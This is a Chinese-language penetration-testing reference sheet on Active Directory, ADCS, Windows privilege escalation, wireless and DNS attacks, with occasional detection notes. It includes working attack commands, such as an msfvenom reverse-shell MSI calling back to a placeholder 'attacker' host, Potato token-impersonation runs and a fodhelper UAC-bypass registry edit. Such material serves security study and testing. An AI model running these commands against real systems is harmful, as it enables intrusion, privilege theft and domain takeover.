# 网络攻击手法

> **难度：** ★★★★☆ | **前置知识：** AD 基础、TCP/IP 协议、Windows 认证机制
> 
> 最后更新：2026-05-14

---

## 内网渗透

**信息收集：**
- NetBIOS 枚举：`nbtscan`
- SMB 枚举：`enum4linux`、`smbclient`
- LDAP 枚举：`ldapsearch`
- DNS 区域传输：`dig axfr`
- ARP 扫描：`arp-scan -l`

**横向移动：**
- Pass-the-Hash：`pth-winexe`、`impacket-psexec`
- Pass-the-Ticket：Kerberos TGT/TGS 票据传递
- Golden Ticket：krbtgt hash 伪造 TGT
- Silver Ticket：服务 hash 伪造 TGS
- DCOM/WMI 远程执行
- WinRM 远程管理

---

## 域渗透经典链

```
获取域用户 → BloodHound 分析攻击路径
→ Kerberoasting → 服务账户 hash → 离线破解
→ AS-REP Roasting → 不需要预认证的用户
→ ACL 滥用 → GenericAll/WriteDacl → 重置密码
→ DCSync → 域管 hash → Golden Ticket → 持久化
```

---

## ADCS 攻击 (Active Directory Certificate Services)

**核心攻击类型：**

| 攻击 | 条件 | 效果 |
|------|------|------|
| ESC1 | CA 管理员 + Web 注册 | 任意用户伪装 |
| ESC2 | CA 管理员 + Web 注册 | 请求任意 EKU |
| ESC3 | CA 管理员 + Web 注册 | 通过 Enrollment Agent 代理注册 |
| ESC4 | 模板 ACL 配置错误 | 修改模板添加攻击者 SAN |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | 任何证书可添加自定义 SAN |
| ESC8 | HTTP 终端 + NTLM | NTLM Relay 到 ADCS |
| ESC13 | 服务账户模板 | 通过服务账户获取用户证书 |

**ESC1 详细利用：**
1. 枚举可注册模板 → Certify/Certipy
2. 发现 VulnerableUser 模板（无 RA 审批 + ENROLLEE_SUPPLIES_SUBJECT）
3. 用普通域用户请求证书，指定 SAN 为域管理员
4. 导出证书 → 获取域管身份
5. Rubeus/PKIINIT 获取 TGT

**工具：** Certify (C#) / Certipy (Python) / BloodHound / Rubeus / ntlmrelayx

**检测：** 监控 Event ID 4886/4887、模板 ACL 变更、SAN 不匹配证书

---

## Windows 权限提升

**服务漏洞提权：**
```powershell
# 枚举可修改的服务
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
# 检查 Unquoted Service Path
wmic service get name,displayname,pathname,startmode
# 检查服务二进制权限
cacls "C:\Path\to\service.exe"
```

**注册表提权：**
```powershell
# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 两个都返回 0x1 → 任何用户安装 MSI 都以 SYSTEM 执行
# 利用：msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o shell.msi
```

**Token 模拟提权（Potato 系列）：**
```powershell
# 前提：目标有 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege
PrintSpoofer.exe -c "cmd /c whoami"     # Win2008-2019
JuicyPotato.exe -l 1337 -p shell.exe -t * -c {CLSID}  # Win2008-2019
GodPotato.exe -cmd "cmd /c whoami"      # Win8-2022
# 原理：创建命名管道 → 触发 SYSTEM 连接 → Token 模拟
```

**UAC 绕过：**
```powershell
# 严格模式绕过
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe
```

**DLL 劫持：**
- 程序加载顺序：程序目录 → 系统目录 → PATH 目录
- Process Monitor 过滤 `NAME NOT FOUND` → 找可写目录 → 放入恶意 DLL

**检测：** Sysmon Event ID 1/12/13、Event ID 4688/7045

---

## 无线攻击

- Evil Twin（伪造 AP）
- WPA2 四次握手抓包 → 离线破解
- PMKID 攻击（不需要客户端）
- KRACK 攻击（重装密钥）
- WPS PIN 暴力破解

---

## DNS 攻击

**DNS Rebinding：**
- 浏览器访问 `evil.com`，DNS 先解析到攻击者 IP
- JS 执行后攻击者快速切换 DNS 到内网 IP
- 浏览器请求发送到内网（同源策略被绕过）
- **防御：** DNS Pinning、企业 DNS 过滤、网络分段

**DNS Tunneling：**
- 数据编码到 DNS 查询（子域名/TXT 记录）
- 工具：dnscat2 / iodine / dns2tcp
- **检测：** DNS 查询频率异常、TXT 记录异常、子域名长度异常

---

_→ 参见 [`tools/bloodhound-mimikatz.md`](../tools/bloodhound-mimikatz.md) 获取域渗透工具详解_
_→ 参见 [`QUICK-REF.md`](../QUICK-REF.md) 获取域渗透速查_
